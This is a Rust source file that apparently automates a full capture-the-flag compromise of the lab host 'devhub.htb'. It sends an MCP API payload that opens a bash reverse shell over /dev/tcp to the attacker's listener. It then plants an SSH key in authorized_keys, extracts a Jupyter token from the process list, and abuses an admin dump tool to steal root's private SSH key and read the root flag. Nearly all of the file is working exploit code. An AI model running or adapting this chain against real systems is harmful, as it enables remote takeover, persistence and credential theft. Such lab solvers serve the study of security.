use anyhow::Result;
use clap::Parser;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;
use tokio::sync::{mpsc,mpsc::Sender,broadcast};
use tokio::time::{timeout, Duration};

use tokio_tungstenite::{connect_async, tungstenite::protocol::Message};
use tungstenite::ClientRequestBuilder;
use futures_util::{SinkExt,StreamExt};
use http::Uri;
use strip_ansi_escapes::strip_str;

use reqwest::Client;
use serde_json::json;

use std::process::{Command,Child};


struct ChildGuard(Child);

impl Drop for ChildGuard {
    fn drop(&mut self){
        let _ = self.0.kill();
        let _ = self.0.wait();
    }
}

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    /// Local Host IP to listen on...
    #[arg(short,long)]
    lhost: String
}

async fn cmd(tx: &Sender<Vec<u8>>,out: broadcast::Sender<Vec<u8>>,payload: &str) -> Result<String> {
    let mut output = Vec::new();
    let mut rx = out.subscribe();
    let c = format!("{}\n",payload).as_bytes().to_vec();
    tx.send(c).await?;
    while let Ok(Ok(data)) = timeout(Duration::from_millis(500),rx.recv()).await {
        output.extend_from_slice(&data);
    }
    Ok(String::from_utf8_lossy(&output)
        .lines()
        .nth(1)
        .unwrap_or("")
        .to_string()
    )
}

async fn user_cmd (id: &String,token: &String,cmd: String)-> Result<String>{
    let url :Uri = format!("ws://127.0.0.1:8888/terminals/websocket/{}",id).parse()?;
    let req = ClientRequestBuilder::new(url)
        .with_header("Authorization",format!("token {}",token));
    let (mut ws_stream,_) = connect_async(req).await?;
    println!("[ws] Terminal websocket initialized...");
    let msg = serde_json::json!(["stdin", format!("{}\n", cmd)]).to_string();
    ws_stream.send(Message::Text(msg.into())).await?;

    let mut output: Vec<String> = Vec::new();
    while let Ok(Some(msg)) = timeout(Duration::from_millis(500),ws_stream.next()).await {
        let msg:Message = msg?;
        output.push(msg.to_text()?.to_string());
    }
    let raw: serde_json::Value = serde_json::from_str(output[3].as_str())?;
    let out = strip_str(raw[1].as_str().unwrap_or("").trim());
    Ok(out)
}

async fn foothold(address: std::net::SocketAddr) -> Result<()>{
    println!("[Foothold Module]");
    let client = Client::new();

    let body = json!({
        "serverConfig":{
            "timeout":1000,
            "command":"bash",
            "args":["-c",format!("bash -i >& /dev/tcp/{}/{} 0>&1",address.ip(),address.port())],
            "env":{},
        },
        "serverId":"w1ld"
    });
    println!("[Foothold] Sending MCP Api Payload using: {}...",address);
    let _res = client
        .post("http://devhub.htb:6274/api/mcp/connect")
        .json(&body)
        .send()
        .await?;

    Ok(())
}

async fn user(tx: &Sender<Vec<u8>>, out: broadcast::Sender<Vec<u8>>) -> Result<(String,String,Child)> {

    println!("[User Module]");

    let client = Client::new();

    println!("[User] Injecting SSH key...");
    let ssh_key = std::fs::read_to_string(format!("{}/.ssh/id_ed25519.pub",std::env::var("HOME")?))?;
    println!("[User] ssh key: {}",ssh_key.trim());
    let _ = cmd(tx,out.clone(),format!("mkdir ~/.ssh && echo '{}' > ~/.ssh/authorized_keys",ssh_key).as_str()).await?;

    println!("[User] Starting SSH tunnel...");
    let tunnel = Command::new("ssh")
        .args([
            "-L","8888:127.0.0.1:8888",
            "mcp-dev@devhub.htb",
            "-N"
            ])
        .spawn()?;

    loop {
        match tokio::net::TcpStream::connect("127.0.0.1:8888").await {
            Ok(_) => { println!("[User] Tunnel up"); break; }
            Err(_) => tokio::time::sleep(Duration::from_millis(200)).await,
        }
    }

    println!("[User] Grabbing Token...");
    let payload = "pgrep -a 'jupyter' | grep -Po '(?<=--ServerApp.token=)[a-z0-9]+'";
    let token = cmd(tx,out.clone(),&payload).await?;
    println!("[User] token: {}",token);

    println!("[User] Grabing Terminal...");
    let res = client
        .post("http://127.0.0.1:8888/api/terminals")
        .header("Authorization", format!("token {}",token))
        .json(&json!({}))
        .send()
        .await?
        .json::<serde_json::Value>()
        .await?;

    let terminal = res["name"].to_string().trim_matches('"').to_string();
    println!("[User] Terminal: {}",terminal);

    println!("[User] Getting user flag...");
    let flag = user_cmd(&terminal,&token,"cat ~/user.txt".to_string()).await?;
    println!("[User] flag: {}",flag);

    Ok((token,terminal,tunnel))
}

async fn root(token: &String, terminal: &String) -> Result<()> {

    let client = Client::new();
    println!("[Root Module]");
    println!("[Root] Getting opsmcp key...");
    let key = user_cmd(terminal,token,"cat .opsmcp_key".to_string()).await?;
    println!("[Root] key: {}",key);

    println!("[Root] Starting SSH tunnel...");
    let tunnel = Command::new("ssh")
        .args([
            "-L","5000:127.0.0.1:5000",
            "mcp-dev@devhub.htb",
            "-N"
            ])
        .spawn()?;

    let _tunnel_guard = ChildGuard(tunnel);

    loop {
        match tokio::net::TcpStream::connect("127.0.0.1:5000").await {
            Ok(_) => { println!("[Root] Tunnel up"); break; }
            Err(_) => tokio::time::sleep(Duration::from_millis(200)).await,
        }
    }

    println!("[Root] Sending API payload to get SSH key...");
    let payload = json!({
        "name":"ops._admin_dump",
        "arguments":{
            "confirm":"true",
            "target":"ssh_keys"
        }
    });
    let res = client
        .post("http://127.0.0.1:5000/tools/call")
        .header("X-API-KEY", key)
        .json(&payload)
        .send()
        .await?
        .json::<serde_json::Value>()
        .await?;

    let ssh_key = res["root_private_key"].as_str().unwrap_or("");

    println!("[Root] SSH key: \n{}",ssh_key);

    let mut tmp = tempfile::NamedTempFile::new()?;
    std::io::Write::write_all(&mut tmp, ssh_key.as_bytes())?;

    println!("[Root] Getting root flag...");
    let root_flag = Command::new("ssh")
        .args([
            "-i",tmp.path().to_str().unwrap(),
            "root@devhub.htb",
            "cat /root/root.txt"
        ])
        .output()?
        .stdout;
    println!("[Root] flag: {}",String::from_utf8_lossy(&root_flag).trim());
    Ok(())
}


#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();

    tokio::spawn(async move {
        // Channels
        let (write_tx, mut write_rx) = mpsc::channel::<Vec<u8>>(100);
        let (out_tx, _) = broadcast::channel::<Vec<u8>>(100);

        //Listener
        let listener = TcpListener::bind(format!("{}:0",args.lhost)).await?;
        println!("[Listener] Listening on: {}", listener.local_addr()?);

        // Foothold
        foothold(listener.local_addr()?).await?;
        let (socket, remote) = listener.accept().await?;
        let (mut reader, mut writer) = socket.into_split();
        println!("[Listener] Connection from: {}", remote);

        // Task 2: write_rx -> writer
        let h2 = tokio::spawn(async move {
            while let Some(data) = write_rx.recv().await {
                writer.write_all(&data).await?;
            }
            Ok::<(), anyhow::Error>(())
        });

        // Task 3: reader -> out_tx
        let h3_out_tx = out_tx.clone();
        let h3 = tokio::spawn(async move {
            let mut buf = [0u8; 4096];
            loop {
                match reader.read(&mut buf).await {
                    Ok(0) => {
                        println!("[-] Connection closed by: {}", remote);
                        break;
                    }
                    Ok(n) => {
                        h3_out_tx.send(buf[..n].to_vec())?;
                    }
                    Err(e) => eprintln!("{}", e),
                }
            }
            Ok::<(), anyhow::Error>(())
        });

        //First flush
        let mut rx = out_tx.subscribe();
        write_tx.send(b"\n".to_vec()).await?;
        while let Ok(Ok(_)) = timeout(Duration::from_millis(500),rx.recv()).await {}

        let (token,terminal,tunnel) = user(&write_tx,out_tx.clone()).await?;
        let rooted = root(&token,&terminal);
        let _tunnel_guard = ChildGuard(tunnel);
        tokio::select!{
            r = h2 => r??,
            r = h3 => r??,
            r = rooted => r?,
        };
        Ok::<(), anyhow::Error>(())
    }).await?
}
